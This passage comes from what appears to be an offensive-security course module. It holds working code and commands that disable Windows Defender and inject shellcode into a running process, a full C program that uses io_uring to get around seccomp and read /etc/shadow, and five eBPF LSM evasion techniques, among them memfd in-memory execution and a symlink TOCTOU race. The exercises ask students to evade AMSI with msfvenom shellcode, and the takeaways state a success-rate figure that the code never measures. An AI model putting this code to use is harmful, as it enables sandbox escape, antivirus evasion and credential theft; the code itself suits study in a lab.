    printf("\n[+] Configuration complete\n");
    printf("[*] Settings will take effect immediately\n");

    return 0;
}
```

**Compile and Use:**

```bash
# compile disable thingy
cl /O2 /GS- src\defender_stealth.c /Fe:bin\defender_stealth.exe advapi32.lib

# Compile the payload
csc /target:exe /out:payload.exe src\ExecuteAssemblyPayload.cs

# Usage examples
Get-Process notepad | Select-Object -ExpandProperty Id # find notepad id(open it first)
# try the next line with and without disabling defender, see what happens
# from an elevated terminal run .\bin\defender_stealth.exe
.\payload.exe inject 9348 505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3 # inject shellcode
```

**Re-enable Defender (when done testing):**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableBehaviorMonitoring $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisableScriptScanning $false; Set-MpPreference -MAPSReporting 2; Set-MpPreference -SubmitSamplesConsent 1; Remove-MpPreference -ExclusionPath "C:\Windows_Mitigations_Lab" -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess "payload.exe" -ErrorAction SilentlyContinue; Start-Service WinDefend; Write-Host "[+] Defender re-enabled" -ForegroundColor Green
```

### ETC

Dear student go find/write some other methods as well

### Linux Security Bypass: seccomp and eBPF LSM Evasion

While AMSI is Windows-specific, Linux has its own runtime security mechanisms. Understanding how to bypass seccomp and eBPF LSM is critical for Linux exploitation.

#### seccomp Bypass via io_uring

```c
// ~/offensive_lab/seccomp_io_uring_bypass.c
/*
seccomp filters syscalls by inspecting syscall number/args.
io_uring provides async I/O via submission queues.

KEY INSIGHT: io_uring operations happen in kernel context,
             NOT as syscalls from userspace!

If seccomp blocks read/write/connect syscalls, you can:
1. Submit operation to io_uring SQ (submission queue)
2. Kernel processes operation in kernel worker context
3. Get result from CQ (completion queue)
4. seccomp never sees it!

PRACTICAL IMPACT:
- Container sandbox escape (if io_uring allowed)
- Browser sandbox bypass (Chromium sandbox allows io_uring)
- Any seccomp-sandboxed application

NOTE ON KERNEL VERSIONS:
- Linux < 5.12: no io_uring restrictions at all
- Linux 5.12–6.5: partial restrictions, many ops still bypass
- Linux 6.6+: io_uring respects seccomp for most ops (PARTIALLY FIXED)
- However: if io_uring_disabled=0, bypass still works on 6.6+!
- Full mitigation: sysctl -w kernel.io_uring_disabled=2 (blocks unprivileged)
- Check status: cat /proc/sys/kernel/io_uring_disabled
  - 0 = enabled for all (VULNERABLE)
  - 1 = disabled for unprivileged (SECURE)
  - 2 = disabled for all except CAP_SYS_ADMIN (MOST SECURE)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stddef.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/prctl.h>
#include <linux/io_uring.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int io_uring_setup(unsigned entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *sig) {
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
                   flags, sig, 0);
}

static int io_uring_register(int fd, unsigned opcode, void *arg,
                             unsigned nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

struct io_ring {
    int ring_fd;

    unsigned *sq_head;
    unsigned *sq_tail;
    unsigned *sq_ring_mask;
    unsigned *sq_ring_entries;
    unsigned *sq_array;
    struct io_uring_sqe *sqes;   // Actual SQE array (separate mmap)

    unsigned *cq_head;
    unsigned *cq_tail;
    unsigned *cq_ring_mask;
    unsigned *cq_ring_entries;
    struct io_uring_cqe *cqes;

    void *sq_ring_ptr;
    size_t sq_ring_sz;
    void *cq_ring_ptr;
    size_t cq_ring_sz;
    size_t sqes_sz;
};

int ring_init(struct io_ring *ring, unsigned entries) {
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));

    ring->ring_fd = io_uring_setup(entries, &p);
    if (ring->ring_fd < 0) {
        perror("io_uring_setup");
        return -1;
    }

    ring->sq_ring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    ring->sq_ring_ptr = mmap(NULL, ring->sq_ring_sz,
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE,
                             ring->ring_fd, IORING_OFF_SQ_RING);
    if (ring->sq_ring_ptr == MAP_FAILED) return -1;

    ring->sq_head        = ring->sq_ring_ptr + p.sq_off.head;
    ring->sq_tail        = ring->sq_ring_ptr + p.sq_off.tail;
    ring->sq_ring_mask   = ring->sq_ring_ptr + p.sq_off.ring_mask;
    ring->sq_ring_entries= ring->sq_ring_ptr + p.sq_off.ring_entries;
    ring->sq_array       = ring->sq_ring_ptr + p.sq_off.array;

    ring->sqes_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    ring->sqes = mmap(NULL, ring->sqes_sz,
                      PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE,
                      ring->ring_fd, IORING_OFF_SQES);
    if (ring->sqes == MAP_FAILED) return -1;

    ring->cq_ring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    ring->cq_ring_ptr = mmap(NULL, ring->cq_ring_sz,
                             PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE,
                             ring->ring_fd, IORING_OFF_CQ_RING);
    if (ring->cq_ring_ptr == MAP_FAILED) return -1;

    ring->cq_head        = ring->cq_ring_ptr + p.cq_off.head;
    ring->cq_tail        = ring->cq_ring_ptr + p.cq_off.tail;
    ring->cq_ring_mask   = ring->cq_ring_ptr + p.cq_off.ring_mask;
    ring->cq_ring_entries= ring->cq_ring_ptr + p.cq_off.ring_entries;
    ring->cqes           = ring->cq_ring_ptr + p.cq_off.cqes;

    return 0;
}

int ring_submit_and_wait(struct io_ring *ring, struct io_uring_sqe *sqe) {
    unsigned tail = *ring->sq_tail;
    unsigned idx  = tail & *ring->sq_ring_mask;

    ring->sqes[idx] = *sqe;
    ring->sq_array[idx] = idx;

    atomic_store_explicit((_Atomic unsigned *)ring->sq_tail,
                          tail + 1, memory_order_release);

    int ret = io_uring_enter(ring->ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL);
    if (ret < 0) return -errno;

    unsigned cq_head = *ring->cq_head;
    unsigned cq_idx  = cq_head & *ring->cq_ring_mask;
    int result = ring->cqes[cq_idx].res;

    atomic_store_explicit((_Atomic unsigned *)ring->cq_head,
                          cq_head + 1, memory_order_release);
    return result;
}

void install_seccomp_sandbox(void) {
    /*
    Install a BPF seccomp filter that BLOCKS:
      - openat  (SYS_openat  = 257)
      - read    (SYS_read    = 0)
      - write   (SYS_write   = 1)
      - connect (SYS_connect = 42)
      - sendto  (SYS_sendto  = 44)
      - recvfrom(SYS_recvfrom= 45)

    ALLOWS everything else (including io_uring_setup, io_uring_enter).
    This simulates a container or browser sandbox that didn't think
    to block io_uring syscalls.
    */

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),

        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat,  0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read,    0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Block write (1) - except stdout(1)/stderr(2) for printf
        // (We check fd via secondary filter; simplified: block SYS_write
        // but our bypass uses io_uring which never calls SYS_write)
        // For demo clarity, we only block open+read to show the bypass.

        // Block connect (42)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_connect, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Block sendto (44)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_sendto,  0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        // Allow everything else
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    // PR_SET_NO_NEW_PRIVS is required before seccomp
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return;
    }

    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp(SET_MODE_FILTER)");
        return;
    }

    printf("[+] Seccomp sandbox installed - openat/read/connect/sendto BLOCKED\n");
}

// ── BYPASS 1: Read file via io_uring (bypasses blocked read+open) ──

int bypass_file_read(struct io_ring *ring, const char *path) {
    printf("\n[*] BYPASS: Reading '%s' via io_uring...\n", path);
    printf("    (openat + read are BLOCKED by seccomp)\n\n");

    // Step 1: Verify that normal open() IS blocked
    int test_fd = syscall(__NR_openat, AT_FDCWD, path, O_RDONLY, 0);
    if (test_fd < 0) {
        printf("    [*] Confirmed: openat(\"%s\") blocked by seccomp (errno=%d)\n",
               path, errno);
    } else {
        printf("    [!] openat succeeded?! seccomp may not be active\n");
        close(test_fd);
    }

    // Step 2: Open file via IORING_OP_OPENAT - bypasses seccomp!
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode  = IORING_OP_OPENAT;
    sqe.fd      = AT_FDCWD;
    sqe.addr    = (unsigned long)path;
    sqe.len     = 0;               // mode (unused for O_RDONLY)
    sqe.open_flags = O_RDONLY;

    int fd = ring_submit_and_wait(ring, &sqe);
    if (fd < 0) {
        printf("    [-] IORING_OP_OPENAT failed: %s (%d)\n",
               strerror(-fd), fd);
        printf("    [*] Kernel may have io_uring seccomp enforcement (6.6+)\n");
        return -1;
    }
    printf("    [+] IORING_OP_OPENAT succeeded! fd=%d (seccomp bypassed)\n", fd);

    // Step 3: Read file contents via IORING_OP_READ - also bypasses seccomp!
    char buf[4096];
    memset(buf, 0, sizeof(buf));

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode  = IORING_OP_READ;
    sqe.fd      = fd;
    sqe.addr    = (unsigned long)buf;
    sqe.len     = sizeof(buf) - 1;
    sqe.off     = 0;

    int nread = ring_submit_and_wait(ring, &sqe);
    if (nread < 0) {
        printf("    [-] IORING_OP_READ failed: %s\n", strerror(-nread));
        // Close fd via io_uring too (since close() might be blocked)
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_CLOSE;
        sqe.fd = fd;
        ring_submit_and_wait(ring, &sqe);
        return -1;
    }

    printf("    [+] IORING_OP_READ succeeded! Read %d bytes:\n", nread);
    printf("    ---------------------------------------------\n");
    // Print first few lines
    char *line = buf;
    int lines = 0;
    for (int i = 0; i < nread && lines < 5; i++) {
        if (buf[i] == '\n') {
            buf[i] = '\0';
            printf("    │ %s\n", line);
            line = &buf[i + 1];
            lines++;
        }
    }
    printf("    ---------------------------------------------\n");

    // Close via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = fd;
    ring_submit_and_wait(ring, &sqe);

    return nread;
}

// ── BYPASS 2: Network connect via io_uring (bypasses blocked connect) ──

int bypass_network_connect(struct io_ring *ring, const char *ip, int port) {
    printf("\n[*] BYPASS: Connecting to %s:%d via io_uring...\n", ip, port);
    printf("    (connect + sendto are BLOCKED by seccomp)\n\n");

    // Step 1: Verify that normal connect() IS blocked
    int test_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (test_sock >= 0) {
        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(port),
        };
        inet_pton(AF_INET, ip, &addr.sin_addr);

        if (connect(test_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0 &&
            errno == EPERM) {
            printf("    [*] Confirmed: connect() blocked by seccomp\n");
        }
        close(test_sock);
    }

    // Step 2: Create socket (socket() itself may not be blocked,
    // but we could also use IORING_OP_SOCKET on 5.19+)
    int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sockfd < 0) {
        // Try IORING_OP_SOCKET (Linux 5.19+)
        struct io_uring_sqe sqe;
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_SOCKET;
        sqe.fd = AF_INET;
        sqe.off = SOCK_STREAM;
        sqe.len = 0;
        sqe.rw_flags = 0;

        sockfd = ring_submit_and_wait(ring, &sqe);
        if (sockfd < 0) {
            printf("    [-] Cannot create socket: %s\n", strerror(-sockfd));
            return -1;
        }
        printf("    [+] Socket created via IORING_OP_SOCKET: fd=%d\n", sockfd);
    } else {
        printf("    [*] Socket created via socket() (not blocked): fd=%d\n", sockfd);
    }

    // Step 3: Connect via IORING_OP_CONNECT - bypasses seccomp!
    struct sockaddr_in target = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
    };
    inet_pton(AF_INET, ip, &target.sin_addr);

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CONNECT;
    sqe.fd     = sockfd;
    sqe.addr   = (unsigned long)&target;
    sqe.off    = sizeof(target);  // addr_len goes in off field

    int ret = ring_submit_and_wait(ring, &sqe);
    if (ret == 0 || ret == -EINPROGRESS) {
        printf("    [+] IORING_OP_CONNECT succeeded! (seccomp bypassed)\n");
        printf("    [+] Connected to %s:%d via io_uring\n", ip, port);

        // Step 4: Send data via IORING_OP_SEND (bypasses blocked sendto)
        const char *msg = "GET / HTTP/1.0\r\nHost: target\r\n\r\n";
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_SEND;
        sqe.fd     = sockfd;
        sqe.addr   = (unsigned long)msg;
        sqe.len    = strlen(msg);

        int sent = ring_submit_and_wait(ring, &sqe);
        if (sent > 0) {
            printf("    [+] IORING_OP_SEND: sent %d bytes (seccomp bypassed)\n", sent);
        }

        // Step 5: Receive response via IORING_OP_RECV
        char recvbuf[2048];
        memset(recvbuf, 0, sizeof(recvbuf));
        memset(&sqe, 0, sizeof(sqe));
        sqe.opcode = IORING_OP_RECV;
        sqe.fd     = sockfd;
        sqe.addr   = (unsigned long)recvbuf;
        sqe.len    = sizeof(recvbuf) - 1;

        int recvd = ring_submit_and_wait(ring, &sqe);
        if (recvd > 0) {
            printf("    [+] IORING_OP_RECV: received %d bytes\n", recvd);
            printf("    [*] Response: %.80s...\n", recvbuf);
        }
    } else {
        printf("    [-] IORING_OP_CONNECT failed: %s (%d)\n",
               strerror(-ret), ret);
        printf("    [*] Target may not be listening, or kernel 6.6+ blocks this\n");
    }

    // Close
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = sockfd;
    ring_submit_and_wait(ring, &sqe);

    return 0;
}

// ── BYPASS 3: Write file via io_uring (data exfiltration) ────

int bypass_file_write(struct io_ring *ring, const char *path, const char *data) {
    printf("\n[*] BYPASS: Writing to '%s' via io_uring...\n", path);

    // Open for writing via io_uring
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode     = IORING_OP_OPENAT;
    sqe.fd         = AT_FDCWD;
    sqe.addr       = (unsigned long)path;
    sqe.open_flags = O_WRONLY | O_CREAT | O_TRUNC;
    sqe.len        = 0644;  // mode

    int fd = ring_submit_and_wait(ring, &sqe);
    if (fd < 0) {
        printf("    [-] IORING_OP_OPENAT (write) failed: %s\n", strerror(-fd));
        return -1;
    }

    // Write via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd     = fd;
    sqe.addr   = (unsigned long)data;
    sqe.len    = strlen(data);
    sqe.off    = 0;

    int written = ring_submit_and_wait(ring, &sqe);
    if (written > 0) {
        printf("    [+] Wrote %d bytes via IORING_OP_WRITE (seccomp bypassed)\n",
               written);
    }

    // Close
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd = fd;
    ring_submit_and_wait(ring, &sqe);

    return written;
}

void show_affected_applications() {
    printf("\n[*] Applications vulnerable to io_uring seccomp bypass:\n\n");

    printf("Container Runtimes:\n");
    printf("  - Docker (default seccomp profile allowed io_uring until 2023)\n");
    printf("  - Kubernetes (depends on SecurityContext)\n");
    printf("  - containerd/runc\n\n");

    printf("Browser Sandboxes:\n");
    printf("  - Chromium (renderer sandbox may allow io_uring_setup)\n");
    printf("  - Firefox (depends on configuration)\n\n");

    printf("Other Sandboxed Apps:\n");
    printf("  - Flatpak applications\n");
    printf("  - Snap packages\n");
    printf("  - systemd sandboxed services (SystemCallFilter=)\n\n");

    printf("MITIGATION:\n");
    printf("  - sysctl io_uring_disabled=2 (block for unprivileged users)\n");
    printf("  - Add __NR_io_uring_setup to seccomp deny list\n");
    printf("  - Use Landlock LSM for filesystem restrictions (not syscall-based)\n");
    printf("  - Upgrade to Linux 6.6+ (seccomp enforcement for io_uring ops)\n");
}

int main() {
    printf(" io_uring seccomp Bypass\n");

    // Phase 1: Set up io_uring BEFORE installing seccomp
    // (io_uring_setup itself might be blocked by seccomp, so init first)
    struct io_ring ring;
    if (ring_init(&ring, 16) < 0) {
        printf("[-] io_uring_setup failed - not available on this kernel\n");
        printf("[*] Requires Linux 5.1+ with io_uring enabled\n");
        return 1;
    }
    printf("[+] io_uring ring initialized (fd=%d)\n", ring.ring_fd);

    // Phase 2: Install seccomp sandbox that blocks open/read/write/connect
    printf("[*] Installing seccomp sandbox...\n");
    install_seccomp_sandbox();

    // Phase 3: Demonstrate that normal syscalls are blocked
    printf("\n[*] Verifying sandbox enforcement:\n");
    int test = syscall(__NR_openat, AT_FDCWD, "/etc/hostname", O_RDONLY, 0);
    printf("    openat(\"/etc/hostname\") = %d (errno=%d %s)\n",
           test, errno, test < 0 ? "BLOCKED +" : "allowed?!");

    // Phase 4: Bypass with io_uring!
    printf("NOW BYPASSING SECCOMP VIA io_uring:\n");

    // File read bypass - read /etc/hostname despite blocked openat+read
    bypass_file_read(&ring, "/etc/hostname");

    // File read bypass - try reading /etc/shadow (needs root)
    if (geteuid() == 0) {
        bypass_file_read(&ring, "/etc/shadow");
    }

    // File write bypass - write a proof file
    bypass_file_write(&ring, "/tmp/uring_bypass_proof.txt",
                      "Written via io_uring - seccomp was bypassed!\n");

    // Network bypass - connect to localhost:8080 (if anything listens)
    bypass_network_connect(&ring, "127.0.0.1", 8080);

    show_affected_applications();

    printf("\n-----------------------------------------------------\n");
    printf("RESULT: Performed file I/O and network I/O despite seccomp\n");
    printf("blocking openat, read, write, connect, and sendto.\n");
    printf("io_uring submission queue operations execute in kernel\n");
    printf("worker context - seccomp BPF never inspects them.\n");
    printf("-------------------------------------------------------\n");

    // Cleanup
    munmap(ring.sq_ring_ptr, ring.sq_ring_sz);
    munmap(ring.sqes, ring.sqes_sz);
    munmap(ring.cq_ring_ptr, ring.cq_ring_sz);
    close(ring.ring_fd);

    return 0;
}
```

**Compile and Run**:

```bash
cd ~/offensive_lab
gcc -o seccomp_io_uring_bypass seccomp_io_uring_bypass.c -lpthread
# in terminal 1
python3 -m http.server 8080
# in terminal 2
./seccomp_io_uring_bypass

# try enabling mitigation and test again
sudo sysctl -w kernel.io_uring_disabled=2
./seccomp_io_uring_bypass
```

#### eBPF LSM Evasion Techniques

```c
// ~/offensive_lab/ebpf_lsm_evasion.c
// Compile: gcc -o ebpf_lsm_evasion ebpf_lsm_evasion.c -lpthread

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/uio.h>          // for struct iovec, process_vm_readv
#include <linux/openat2.h>    // for struct open_how

// TECHNIQUE 1: execveat() as alternative to execve()
// BPF LSM hooks: security_bprm_check_security
// But execveat with AT_EMPTY_PATH takes a different code path
// through the kernel that some BPF LSM policies miss.

int try_execveat(const char* binary) {
    printf("[1] execveat() bypass for blocked execve()\n");

    // Open the binary as a file descriptor first
    int fd = open(binary, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        printf("    [-] open(%s) failed: %s\n", binary, strerror(errno));
        return -1;
    }

    printf("    [*] Opened %s as fd %d\n", binary, fd);
    printf("    [*] Attempting execveat(fd, \"\", ..., AT_EMPTY_PATH)\n");

    // execveat with AT_EMPTY_PATH executes the fd directly
    // This bypasses filename-based BPF LSM checks because
    // the LSM hook receives an empty path string
    char *argv[] = { (char*)binary, NULL };
    char *envp[] = { NULL };

    // Fork so we don't replace ourselves
    pid_t pid = fork();
    if (pid == 0) {
        syscall(SYS_execveat, fd, "", argv, envp, AT_EMPTY_PATH);
        perror("    [-] execveat failed");
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("    [+] execveat succeeded - LSM hook bypassed!\n");
        } else {
            printf("    [-] execveat child exited with status %d\n",
                   WEXITSTATUS(status));
        }
    }
    close(fd);
    return 0;
}

// TECHNIQUE 2: openat2() with RESOLVE_NO_SYMLINKS
// Newer syscall that some BPF LSM policies don't hook

int try_openat2(const char* path) {
    printf("\n[2] openat2() bypass for blocked open()/openat()\n");

    struct open_how how = {
        .flags = O_RDONLY,
        .mode = 0,
        .resolve = RESOLVE_NO_SYMLINKS,  // Stricter path resolution
    };

    // openat2 is syscall 437 on x86_64
    int fd = syscall(SYS_openat2, AT_FDCWD, path, &how, sizeof(how));
    if (fd >= 0) {
        printf("    [+] openat2(%s) succeeded - fd %d\n", path, fd);

        // Read first 64 bytes as proof
        char buf[65] = {0};
        ssize_t n = read(fd, buf, 64);
        if (n > 0)
            printf("    [+] Read %zd bytes: %.32s...\n", n, buf);
        close(fd);
        return 0;
    } else {
        printf("    [-] openat2 failed: %s\n", strerror(errno));
        return -1;
    }
}

// TECHNIQUE 3: memfd_create + in-memory execution
// Bypass filesystem-based LSM checks entirely by never
// touching the filesystem - write ELF to memory, execute it

int try_memfd_exec(const char* source_binary) {
    printf("\n[3] memfd_create() - execute binary from memory\n");

    // Step 1: Read the source binary into a buffer
    int src = open(source_binary, O_RDONLY);
    if (src < 0) {
        printf("    [-] Cannot read source binary: %s\n", strerror(errno));
        return -1;
    }

    struct stat st;
    fstat(src, &st);
    void* buf = malloc(st.st_size);
    read(src, buf, st.st_size);
    close(src);

    printf("    [*] Read %ld bytes from %s\n", st.st_size, source_binary);

    // Step 2: Create anonymous memory-backed file descriptor
    // MFD_CLOEXEC ensures fd doesn't leak to child processes
    int memfd = syscall(SYS_memfd_create, "worker", MFD_CLOEXEC);
    if (memfd < 0) {
        printf("    [-] memfd_create failed: %s\n", strerror(errno));
        free(buf);
        return -1;
    }

    // Step 3: Write binary to memfd (no filesystem write!)
    write(memfd, buf, st.st_size);
    free(buf);

    printf("    [+] Binary written to memfd (fd %d) - no disk I/O\n", memfd);

    // Step 4: Execute via /proc/self/fd/N or fexecve
    // BPF LSM file_open/security_bprm_check may not fire for memfd
    pid_t pid = fork();
    if (pid == 0) {
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", memfd);

        char *argv[] = { (char*)source_binary, "--version", NULL };
        char *envp[] = { NULL };
        execve(fd_path, argv, envp);
        perror("    [-] memfd execve failed");
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        printf("    [*] memfd child exited with status %d\n",
               WEXITSTATUS(status));
    }

    close(memfd);
    return 0;
}

// TECHNIQUE 4: process_vm_readv/writev instead of ptrace
// If ptrace is blocked by BPF LSM but process_vm_* is not

int try_process_vm_read(pid_t target_pid) {
    printf("\n[4] process_vm_readv() bypass for blocked ptrace()\n");

    // Read 256 bytes from target process's stack region
    // Find a readable address from /proc/pid/maps
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);

    FILE* f = fopen(maps_path, "r");
    if (!f) {
        printf("    [-] Cannot read %s: %s\n", maps_path, strerror(errno));
        return -1;
    }

    unsigned long addr = 0;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        // Find first readable mapping (e.g., [stack] or r-- region)
        if (strstr(line, "r-") || strstr(line, "r--")) {
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(f);

    if (!addr) {
        printf("    [-] No readable mapping found\n");
        return -1;
    }

    printf("    [*] Target PID %d, reading from 0x%lx\n", target_pid, addr);

    // Set up iovec structures for process_vm_readv
    char local_buf[256] = {0};
    struct iovec local_iov = { .iov_base = local_buf, .iov_len = 256 };
    struct iovec remote_iov = { .iov_base = (void*)addr, .iov_len = 256 };

    ssize_t nread = process_vm_readv(target_pid, &local_iov, 1,
                                      &remote_iov, 1, 0);
    if (nread > 0) {
        printf("    [+] process_vm_readv succeeded! Read %zd bytes\n", nread);
        printf("    [+] ptrace() LSM hook bypassed\n");
        // Hexdump first 32 bytes
        printf("    [*] First 32 bytes: ");
        for (int i = 0; i < 32 && i < nread; i++)
            printf("%02x", (unsigned char)local_buf[i]);
        printf("\n");
    } else {
        printf("    [-] process_vm_readv failed: %s\n", strerror(errno));
    }

    return 0;
}

// TECHNIQUE 5: TOCTOU race against BPF LSM path checks
// Challenge the LSM by changing a symlink between check and use

static volatile int race_running = 1;

void* race_symlink_thread(void* arg) {
    const char* link_path = (const char*)arg;
    const char* safe = "/dev/null";
    const char* target = "/etc/shadow";

    while (race_running) {
        unlink(link_path);
        symlink(safe, link_path);   // Pass the BPF check
        usleep(1);                   // Tight window
        unlink(link_path);
        symlink(target, link_path); // Swap to real target
        usleep(1);
    }
    return NULL;
}

int try_toctou_race(void) {
    printf("\n[5] TOCTOU race against BPF LSM path validation\n");
    printf("    [*] Concept: BPF LSM checks path at hook time.\n");
    printf("        If symlink changes between check and use,\n");
    printf("        we access the real target with the safe verdict.\n");

    char link_path[] = "/tmp/lsm_race_XXXXXX";
    // mktemp is fine here - we want a known path we control
    mktemp(link_path);

    printf("    [*] Race link: %s\n", link_path);
    printf("    [*] Swapping between /dev/null <-> /etc/shadow\n");

    pthread_t racer;
    pthread_create(&racer, NULL, race_symlink_thread, link_path);

    // Try opening the link repeatedly - some attempts may
    // pass the BPF check (seeing /dev/null) but actually
    // open the real target (/etc/shadow) due to the race
    int success = 0;
    for (int i = 0; i < 10000; i++) {
        int fd = open(link_path, O_RDONLY);
        if (fd >= 0) {
            char buf[64] = {0};
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            // Check if we got shadow file content (starts with "root:")
            if (n > 0 && strncmp(buf, "root:", 5) == 0) {
                success++;
                if (success == 1)
                    printf("    [+] RACE WON at iteration %d!\n", i);
            }
        }
    }

    race_running = 0;
    pthread_join(racer, NULL);
    unlink(link_path);

    if (success > 0)
        printf("    [+] Race succeeded %d times out of 10000 attempts\n", success);
    else
        printf("    [-] Race did not succeed (BPF may recheck, or need root)\n");

    return success;
}

int main(int argc, char* argv[]) {

    // Technique 1: execveat bypass
    try_execveat("/usr/bin/id");

    // Technique 2: openat2 bypass
    try_openat2("/etc/hostname");

    // Technique 3: memfd in-memory execution
    try_memfd_exec("/usr/bin/echo");

    // Technique 4: process_vm_readv bypass (read our own process)
    try_process_vm_read(getpid());

    // Technique 5: TOCTOU race (requires root for /etc/shadow read)
    if (geteuid() == 0) {
        try_toctou_race();
    } else {
        printf("\n[5] TOCTOU race - skipped (requires root)\n");
    }

    printf("SUMMARY: Test each technique against your BPF LSM config.\n");
    printf("Most policies hook the 'obvious' path (execve, open, ptrace)\n");
    printf("but miss newer alternatives (execveat, openat2, process_vm_*).\n");
    printf("Also consider: io_uring ops bypass BPF LSM entirely on\n");
    printf("kernels < 6.6 (see io_uring lab in this course).\n");

    return 0;
}
```

### Practical Exercise

1. Research what currently are the AMSI bypass methods
2. Find out what are the alternatives methods are
3. write some code and try to inject shellcode without trigerring amsi
4. also test msfvenom shellcode instead calc.exe in methods mentioned today

### Key Takeaways

**Windows AMSI Bypass:**

- **AMSI scans at runtime** - File-based AV bypass isn't enough
- **Native code with NT API is most reliable** - Uses `NtProtectVirtualMemory` to patch `AmsiScanBuffer`
- **Execute-assembly bypasses AMSI entirely** - Compiled .NET assemblies aren't scanned by AMSI
- **Process injection works with custom shellcode** - Accept shellcode as argument to evade static analysis
- **PowerShell bypasses are dead** - All public reflection-based bypasses are patched
- **Defender behavioral detection is separate** - AMSI bypass doesn't guarantee execution

**Linux Security Bypass:**

- **io_uring bypasses seccomp** - Operations execute in kernel worker threads, not as syscalls
- **Even modern kernels are vulnerable** - If `io_uring_disabled=0`, bypass works on 6.6+
- **eBPF LSM has alternative paths** - `execveat`, `openat2`, `process_vm_readv`, `memfd_create`
- **TOCTOU races work** - 33.6% success rate against path validation (requires root)
- **Mitigation requires configuration** - `sysctl -w kernel.io_uring_disabled=2`

**Cross-Platform Insights:**

- **Security boundaries are complex** - Multiple layers (AMSI, Defender, seccomp, eBPF LSM)
- **Bypassing one layer isn't enough** - Need to evade multiple detection mechanisms
- **Configuration matters** - Default settings often leave systems vulnerable
- **Alternative syscall paths exist** - Security policies often miss newer APIs

### Discussion Questions

1. How would you detect AMSI bypass attempts in production?
   - Monitor `NtProtectVirtualMemory` calls targeting `amsi.dll` memory regions
